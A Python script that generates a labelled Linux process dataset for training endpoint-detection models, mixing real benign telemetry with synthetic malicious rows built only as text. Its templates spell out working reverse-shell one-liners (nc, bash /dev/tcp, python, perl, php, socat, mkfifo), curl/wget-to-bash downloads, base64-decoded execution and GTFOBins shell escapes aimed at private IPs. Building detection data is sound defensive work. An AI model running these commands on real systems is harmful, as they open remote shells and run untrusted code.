"""Build a real+catalogued Linux process training set for the EDR models.

Benign  = deduplicated real telemetry captured from the host (data/training/EDR/captures/).
Malicious = rows generated from real attack-command catalogs (GTFOBins / Atomic Red Team style),
            formatted to match the auditd collector exactly (basename name, full-path path,
            argv-joined command_line, real-style parent names, is_first_seen).

No attacks are executed - the malicious side is produced purely as text.

is_first_seen is deliberately decorrelated from the label: benign has ~237 first-seen events, and
malicious is capped to a similar number of first-seen (dropped-binary) rows, so first-seen is NOT a
class shortcut.

Usage:
    python3 scripts/generate_edr_dataset.py \
        --capture data/training/EDR/captures/benign_capture.jsonl \
        --out data/training/EDR/raw/process_linux.jsonl \
        --benign 3500 --malicious 2500 --seed 42
"""
import argparse
import json
import os
import random

FIELDS = ["pid", "ppid", "name", "path", "command_line",
          "parent_name", "user", "is_first_seen", "label"]

IPS = [f"10.10.14.{random.randint(2,254)}" for _ in range(20)] + \
      [f"192.168.56.{n}" for n in range(2, 40)] + \
      [f"10.0.0.{n}" for n in range(2, 40)] + \
      [f"172.16.{random.randint(0,31)}.{random.randint(2,254)}" for _ in range(20)]
PORTS = [4444, 5555, 1337, 9001, 9002, 8080, 8443, 443, 80, 53, 4443,
         31337, 2222, 6666, 12345, 1234, 7777, 5900]
USERS = ["dudu"] * 6 + ["root"] * 3 + ["www-data"] * 1
SHELL_PARENTS = ["bash", "sh", "dash", "python3", "zsh"]


def rand_name(n=6):
    return "".join(random.choice("abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(n))


def mrow(name, path, cmd, first_seen, parent=None):
    return {
        "pid": random.randint(20000, 60000),
        "ppid": random.randint(1000, 20000),
        "name": name,
        "path": path,
        "command_line": cmd,
        "parent_name": parent or random.choice(SHELL_PARENTS),
        "user": random.choice(USERS),
        "is_first_seen": first_seen,
        "label": 1,
    }


# ---- malicious template generators (each returns one row) ----
def t_nc_revshell():
    ip, port = random.choice(IPS), random.choice(PORTS)
    variant = random.choice([
        ("nc.traditional", "/bin/nc.traditional", f"nc -e /bin/bash {ip} {port}"),
        ("nc.traditional", "/bin/nc.traditional", f"nc -e /bin/sh {ip} {port}"),
        ("nc.traditional", "/bin/nc.traditional", f"nc -c bash {ip} {port}"),
        ("nc.traditional", "/bin/nc.traditional", f"nc -vz {ip} {port}"),
        ("ncat", "/usr/bin/ncat", f"ncat -e /bin/bash {ip} {port}"),
        ("ncat", "/usr/bin/ncat", f"ncat --exec /bin/sh {ip} {port}"),
    ])
    return mrow(variant[0], variant[1], variant[2], False)


def t_devtcp():
    ip, port = random.choice(IPS), random.choice(PORTS)
    if random.random() < 0.5:
        return mrow("bash", "/usr/bin/bash",
                    f"bash -c bash -i >& /dev/tcp/{ip}/{port} 0>&1", False)
    return mrow("dash", "/usr/bin/dash",
                f"sh -c sh -i >& /dev/tcp/{ip}/{port} 0>&1", False)


def t_python_rev():
    ip, port = random.choice(IPS), random.choice(PORTS)
    return mrow("python3", "/usr/bin/python3",
                f"python3 -c import socket,subprocess,os;s=socket.socket();"
                f"s.connect(('{ip}',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
                f"os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])", False)


def t_perl_rev():
    ip, port = random.choice(IPS), random.choice(PORTS)
    return mrow("perl", "/usr/bin/perl",
                f"perl -e use Socket;$i='{ip}';$p={port};socket(S,PF_INET,SOCK_STREAM,"
                f"getprotobyname('tcp'));connect(S,sockaddr_in($p,inet_aton($i)));"
                f"exec('/bin/sh -i');", False)


def t_php_rev():
    ip, port = random.choice(IPS), random.choice(PORTS)
    return mrow("php", "/usr/bin/php",
                f"php -r $sock=fsockopen('{ip}',{port});exec('/bin/sh -i <&3 >&3 2>&3');",
                False, parent=random.choice(["nginx", "apache2", "sh", "bash"]))


def t_socat():
    ip, port = random.choice(IPS), random.choice(PORTS)
    return mrow("socat", "/usr/bin/socat",
                f"socat exec:/bin/bash,pty,stderr tcp:{ip}:{port}", False)


def t_download_pipe():
    ip, port = random.choice(IPS), random.choice(PORTS)
    fn = rand_name()
    tool = random.choice(["curl", "wget"])
    if tool == "curl":
        cmd = f"bash -c curl -fsSL http://{ip}:{port}/{fn}.sh | bash"
    else:
        cmd = f"bash -c wget -qO- http://{ip}:{port}/{fn}.sh | sh"
    return mrow("bash", "/usr/bin/bash", cmd, False)


def t_dropped_exec():
    # download-to-disk then run a NEW binary -> is_first_seen TRUE (novel exe path)
    fn = rand_name()
    d = random.choice(["/tmp", "/dev/shm", "/var/tmp"])
    return mrow(fn, f"{d}/{fn}", f"{d}/{fn}", True)


def t_tmp_script():
    fn = rand_name()
    d = random.choice(["/tmp", "/dev/shm", "/var/tmp"])
    return mrow("dash", "/usr/bin/dash",
                random.choice([f"/bin/sh {d}/{fn}.sh", f"sh {d}/{fn}.sh"]), False)


def t_encoded():
    b64 = "".join(random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/")
                  for _ in range(random.randint(28, 96)))
    if random.random() < 0.5:
        return mrow("bash", "/usr/bin/bash", f"bash -c echo {b64} | base64 -d | bash", False)
    return mrow("python3", "/usr/bin/python3",
                f"python3 -c exec(__import__('base64').b64decode('{b64}'))", False)


def t_gtfobins():
    return random.choice([
        mrow("gawk", "/usr/bin/gawk", "awk BEGIN{system(\"/bin/sh\")}", False),
        mrow("find", "/usr/bin/find", "find . -exec /bin/sh ; -quit", False),
        mrow("python3", "/usr/bin/python3", "python3 -c import pty;pty.spawn('/bin/bash')", False),
        mrow("vim.basic", "/usr/bin/vim.basic", "vim -c :!/bin/sh", False),
        mrow("env", "/usr/bin/env", "env /bin/sh", False),
        mrow("perl", "/usr/bin/perl", "perl -e exec '/bin/sh';", False),
    ])


def t_mkfifo_backpipe():
    ip, port = random.choice(IPS), random.choice(PORTS)
    return mrow("dash", "/usr/bin/dash",
                f"sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
                False)


FIRST_SEEN_FALSE = [t_nc_revshell, t_devtcp, t_python_rev, t_perl_rev, t_php_rev,
                    t_socat, t_download_pipe, t_tmp_script, t_encoded, t_gtfobins,
                    t_mkfifo_backpipe]


def load_benign(path, target, seen_users):
    seen = set()
    first, rest = [], []
    with open(path, encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            r = json.loads(line)
            row = {k: r.get(k) for k in ["pid", "ppid", "name", "path", "command_line",
                                         "parent_name", "user", "is_first_seen"]}
            row["label"] = 0
            key = (row["name"], row["path"], row["command_line"],
                   row["parent_name"], row["user"], row["is_first_seen"])
            if key in seen:
                continue
            seen.add(key)
            (first if row["is_first_seen"] else rest).append(row)
    random.shuffle(rest)
    keep = first + rest[:max(0, target - len(first))]  # keep ALL first-seen benign
    random.shuffle(keep)
    return keep, len(first)


def build_malicious(n):
    rows = []
    n_first = min(int(n * 0.07), 200)          # cap first-seen malicious near benign's ~237
    for _ in range(n_first):
        rows.append(t_dropped_exec())
    for _ in range(n - n_first):
        rows.append(random.choice(FIRST_SEEN_FALSE)())
    # dedup identical rows (keep variety from the randomized params)
    uniq, out = set(), []
    for r in rows:
        k = (r["name"], r["command_line"], r["is_first_seen"])
        if k in uniq:
            continue
        uniq.add(k)
        out.append(r)
    return out


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--capture", default="data/training/EDR/captures/benign_capture.jsonl")
    ap.add_argument("--out", default="data/training/EDR/raw/process_linux.jsonl")
    ap.add_argument("--benign", type=int, default=3500)
    ap.add_argument("--malicious", type=int, default=2500)
    ap.add_argument("--seed", type=int, default=42)
    args = ap.parse_args()

    random.seed(args.seed)

    benign, n_first_benign = load_benign(args.capture, args.benign, USERS)
    malicious = build_malicious(args.malicious)

    rows = benign + malicious
    random.shuffle(rows)

    if os.path.exists(args.out):
        bak = args.out + ".prejitter.bak"
        os.replace(args.out, bak)
        print(f"backed up old {args.out} -> {bak}")

    os.makedirs(os.path.dirname(args.out), exist_ok=True)
    with open(args.out, "w", encoding="utf-8") as f:
        for r in rows:
            f.write(json.dumps({k: r[k] for k in FIELDS}) + "\n")

    b_first = sum(1 for r in benign if r["is_first_seen"])
    m_first = sum(1 for r in malicious if r["is_first_seen"])
    print(f"wrote {len(rows)} rows to {args.out}")
    print(f"  benign:    {len(benign)}  (first_seen true: {b_first})")
    print(f"  malicious: {len(malicious)}  (first_seen true: {m_first})")
    print(f"  first_seen=true population: benign {b_first} vs malicious {m_first} "
          f"(should be roughly balanced so it is not a shortcut)")


if __name__ == "__main__":
    main()
